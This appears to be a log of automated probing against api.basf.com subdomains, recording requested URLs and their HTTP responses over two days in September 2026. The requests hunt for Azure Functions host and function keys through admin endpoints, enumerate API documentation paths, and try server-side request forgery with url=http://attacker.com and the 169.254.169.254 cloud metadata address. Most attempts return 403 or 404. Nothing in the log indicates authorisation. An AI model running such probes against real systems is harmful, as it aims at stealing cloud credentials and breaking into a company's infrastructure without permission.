
## 2026-09-03 09:40:45 UTC


## 2026-09-03 14:03:05 UTC
https://ap-digitalconnect.api.basf.com/admin/host/keys -> HTTP 404
https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
https://ap-eupf.api.basf.com/api/<function>?url=http://attacker.com -> HTTP 403
https://ap-eupf.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -> HTTP 403

## 2026-09-03 17:55:37 UTC
https://ap-digitalconnect.api.basf.com/admin/keys -> HTTP 404
https://ap-digitalconnect.api.basf.com/runtime/webhooks/host/keys -> HTTP 404
https://ap-eupf.api.basf.com/api/HttpTrigger1?url=http://attacker.com -> HTTP 403
https://ap-eupf.api.basf.com/api/HttpTrigger1 -> HTTP 404
https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
https://ap-eupf.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -> HTTP 403
https://ap-digitalconnect.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -> HTTP 403
https://dev-ext001.api.basf.com/ -> HTTP 400

## 2026-09-03 21:00:34 UTC
https://ap-digitalconnect.api.basf.com/.azurefunctions/keys -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/v2/keys -> HTTP 404
https://ap-eupf.api.basf.com/api/<enum>?url=http://attacker.com -> HTTP 403
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
https://ap-eupf.api.basf.com/api/health -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/list -> HTTP 404
https://dev-ext001.api.basf.com/ -> HTTP 400

## 2026-09-03 23:13:36 UTC
https://ap-digitalconnect.api.basf.com/admin/host/keys?slot=staging -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/host/keys?slot=production -> HTTP 404
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
https://ap-eupf.api.basf.com/api/health -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/list -> HTTP 404
https://dev-ext001.api.basf.com/ -> HTTP 400

## 2026-09-04 01:13:47 UTC
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://ap-digitalconnect.api.basf.com/admin/host/systemkeys -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/functions -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/host/status -> HTTP 404

## 2026-09-04 06:06:04 UTC
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-digitalconnect.api.basf.com/admin/host/functionkeys -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/system -> HTTP 404

## 2026-09-04 11:37:50 UTC
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/api-docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger/ui -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/.well-known/openapi-schema -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://ap-digitalconnect.api.basf.com/admin/host/functionkeys -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/system -> HTTP 404

## 2026-09-04 15:26:14 UTC
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://ap-digitalconnect.api.basf.com/admin/host/functionkeys -> HTTP 404
https://ap-digitalconnect.api.basf.com/admin/system -> HTTP 404

## 2026-09-04 18:36:18 UTC
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/api-docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger/ui -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/.well-known/openapi-schema -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-eupf.api.basf.com/ -> 200 len=150093
https://e-gate.api.basf.com/ -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce

## 2026-09-04 21:06:33 UTC
https://e-gate.api.basf.com/openapi.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger.json -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/api-docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/docs -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/swagger/ui -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://e-gate.api.basf.com/.well-known/openapi-schema -> ERR <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] ce
https://ap-eupf.api.basf.com/ -> 200 len=150093
